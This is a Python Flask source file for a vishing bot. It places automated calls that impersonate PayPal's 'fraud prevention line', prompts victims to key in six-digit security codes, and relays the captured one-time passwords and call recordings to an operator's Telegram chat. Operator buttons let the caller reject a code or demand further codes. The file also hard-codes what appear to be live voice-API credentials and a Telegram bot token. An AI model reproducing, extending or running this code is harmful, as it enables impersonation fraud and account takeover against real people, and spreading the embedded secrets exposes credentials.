from flask import Flask, jsonify, request
import requests
import json
import urllib.parse
class CallSidManager:
    def __init__(self):
        self.current_id = 0
        self.sid_to_id_map = {}
        self.id_to_sid_map = {}

    def generate_short_id(self, callsid):
        if callsid in self.sid_to_id_map:
            return self.sid_to_id_map[callsid]

        self.current_id += 1
        short_id = str(self.current_id)

        self.sid_to_id_map[callsid] = short_id
        self.id_to_sid_map[short_id] = callsid

        return short_id

    def get_callsid(self, short_id):
        return self.id_to_sid_map.get(short_id)


app = Flask(__name__)
call_sid_manager = CallSidManager()

jokerapikey = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
token = "6409753184:AAGdJ3GBWBM2TkeFaJ-8nLB4qsjQakVy4AQ"
@app.route("/callback", methods=["POST"])
def callbacks():


    data = request.json  
    print("Received callback data:", data)
    
    return jsonify({"message": "Callback received successfully"}), 200


@app.route("/makecall/<chat_id>/<name>", methods=["POST"])
def call(chat_id,name):
    try:
        data = request.json
        print(data)
        if 'event_name' in data and 'data' in data:
            callsid = data['data']['call_sid']
        else:
            return jsonify({"message": "Callback received successfully"}), 200   
        print("Received callback data:", data)
        
        short_id = call_sid_manager.generate_short_id(callsid)
        if data['event_name'] == "call.ringing":
                cca = str(short_id +"$"+ chat_id)
                callback_accept = json.dumps({"action": "endcall", "sid": cca})

                keyboard = [
                    [

                        {"text": "End Call", "callback_data": callback_accept},
                    ],
                ]

                params = {
                    "chat_id": chat_id,
                    "text": "├ Rining",
                    "reply_markup": json.dumps({"inline_keyboard": keyboard}),
                }

                response = requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data=params)

                print(response.json()) 

                return jsonify({"message": "Event processed successfully"}), 200
        elif data['event_name'] == "call.in_progress":
            print("Answered")
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',

            }
            data = {
            'max_digits' : '1',
            'call_id' : callsid,
            'text' : f"Hello {name}, this is an automated call from the Paypal fraud prevention line. We have sent this automated call because of an attempt to change the phone number linked to your Paypal account. If this was not you, please press 1. If this was you, you may hangup now.",
            'voice' : 'Joanna'
            }
            response = requests.post(
                'https://api.apivalley.su/api/v1/calls/gather-say',
                headers=headers,
                json=data,  
                auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
            )
            cca = str(short_id +"$"+ chat_id)
            callback_accept = json.dumps({"action": 1, "sid": cca })
            callback_decline = json.dumps({"action": 2, "sid": cca})
            callback_more = json.dumps({"action": 3, "sid": cca})
            print (callback_accept)
            keyboard = [
                [

                    {"text": "accept", "callback_data": callback_accept},
                    {"text": "more", "callback_data": callback_more},
                    {"text": "reject", "callback_data": callback_decline},
                ],
            ]

            params = {
                "chat_id": chat_id,
                "text": f"├ ✅ OTP Code:  Choose an option:",
                "reply_markup": json.dumps({"inline_keyboard": keyboard}),
            }

            

            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 🤳 Call has been answered.") and requests.post(f"https://api.telegram.org/bot{token}/sendMessage", data=params)
            print("Response:", response.json())
            return jsonify({"message": "Event processed successfully"}), 200

        elif data['event_name'] == "amd.human":
                r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├  Human Detected")
                return jsonify({"message": "Event processed successfully"}), 200
        elif data['event_name'] == "amd.machine":
                r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 🔔 Voicemail Detected")
                return jsonify({"message": "Event processed successfully"}), 200
        elif data['event_name'] == "call.completed":
            
            r = requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📵 Call has been hangup.")
            return jsonify({"message": "Event processed successfully"}), 200
        elif data['event_name'] == "call.recording":
                    response = requests.get(data['data']['recording_url'])
                    print(data['data']['recording_url'])
                    payload = {
                        'chat_id': chat_id,
                        'title': 'transcript.wav',
                        'parse_mode': 'HTML'
                    }
                    files = {
                        'audio': response.content,
                    }
                    requests.post(f"https://api.telegram.org/bot{token}/sendAudio".format(token=f"{token}"),
                        data=payload,
                        files=files) and requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📞 Call has been hangup.")
                    return jsonify({"message": "Event processed successfully"}), 200
        elif data['event_name'] == "dtmf.captured":
            if data['data']['digits'] == "1":
                print(data['data']['digits'])
                headers = {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',

                }
                data = {
                'max_digits' : '6',
                'call_id' : callsid,
                'text' : f"To block this request, please enter the 6 digit security code that we have sent to your mobile device",
                'voice' : 'Joanna'
                }
                response = requests.post(
                    'https://api.apivalley.su/api/v1/calls/gather-say',
                    headers=headers,
                    json=data,  
                    auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
                )
                r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ 📲 Send OTP..")

                print("Response:", response.json())
                return jsonify({"message": "Event processed successfully"}), 200 
            elif len(data['data']['digits']) == 6:
                otp2 = data['data']['digits']
                print(data['data']['digits'])
                headers = {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json',

                }
                data = {
                'max_digits' : '2',
                'call_id' : callsid,
                'text' : f"Please wait until we check the code",
                'voice' : 'Joanna'
                }
                response = requests.post(
                    'https://api.apivalley.su/api/v1/calls/gather-say',
                    headers=headers,
                    json=data,  
                    auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
                )
                
                r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text=├ {otp2} is the code")
                return jsonify({"message": "Event processed successfully"}), 200
            return jsonify({"message": "Event processed successfully"}), 200

        else:
            return jsonify({"message": "Callback received successfully"}), 200
            
    except Exception as e:
        app.logger.error(f"Exception in call function: {e}")
        return jsonify({"error": "An error occurred processing the request"}), 500
 
@app.route('/otp', methods=['POST'])
def handle_update():
    data = request.get_json()
    print(data)
    callsid, chat_id1 = data['sid'].split('$')
    action = data.get('action')  

    print(chat_id1)
    if action == 1 :
            callsid1 = call_sid_manager.get_callsid(callsid)
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',

            }
            data = {
            'call_id' : callsid1,
            'text' : f"Thank you, the code is valid",
            'voice' : 'Joanna'
            }
            response = requests.post(
                'https://api.apivalley.su/api/v1/calls/say',
                headers=headers,
                json=data,  
                auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
            )
            r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ code accepted")
    elif action == 'endcall' :
            callsid1 = call_sid_manager.get_callsid(callsid)
            headers = {
                'Content-Type': 'application/json',
                'Accept': 'application/json',

            }
            data = {
            'call_id' : callsid1,
            }
            response = requests.post(
                'https://api.apivalley.su/api/v1/calls/hangup',
                headers=headers,
                json=data,  
                auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
            )
    elif action == 2 :  
        callsid1 = call_sid_manager.get_callsid(callsid)

        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',

        }
        data = {
        'max_digits' : '6',
        'call_id' : callsid1,
        'text' : f"the code you entered is not valid , please enter the code again",
        'voice' : 'Joanna'
        }
        response = requests.post(
            'https://api.apivalley.su/api/v1/calls/gather-say',
            headers=headers,
            json=data,  
            auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
        )
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ code rejected")
    elif action == 3 : 
        callsid1 = call_sid_manager.get_callsid(callsid)

        headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',

        }
        data = {
        'max_digits' : '6',
        'call_id' : callsid1,
        'text' : f"Thank you , but for more security we have sent you one more code , please enter it",
        'voice' : 'Joanna'
        }
        response = requests.post(
            'https://api.apivalley.su/api/v1/calls/gather-say',
            headers=headers,
            json=data,  
            auth=('9acf0625-38e6-4a04-8f31-3163145b121f', 'Q8Drtr3qZfdNbHtSdwoCG5yME0s8Vy5N4Vt7qEtfKXWjhaptYQ2giI0Dof8faM60'),
        ) 
        r = requests.get(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id1}&text=├ asked for more code")

    return 'ok'
@app.route('/decline/<sid>', methods=['POST'])
def decline(sid):
# Define the base URL and parameters
    base_url = "https://api.jokerapi.co/voice/v1/gathertext"
    api_key = "mA91SG0XdS6ZUX2SEivdhD107AopdAfZ"
    callsid1 = sid
    text = "The code you entered isn't valid , please enter the code again"
    voice = "ai3-Jenny"
    max_digits = 6

    # URL encode the parameters
    encoded_text = urllib.parse.quote(text)

    # Construct the URL using f-string with encoded parameters
    url = f"{base_url}?apikey={api_key}&callsid={callsid1}&text={encoded_text}&voice={voice}&maxdigits={max_digits}"
    response = requests.post(url) 
    # Print the final URL
    print("Response:", response.json() )
    return 'ok'


if __name__ == "__main__":    
    app.run("0.0.0.0", port=8080)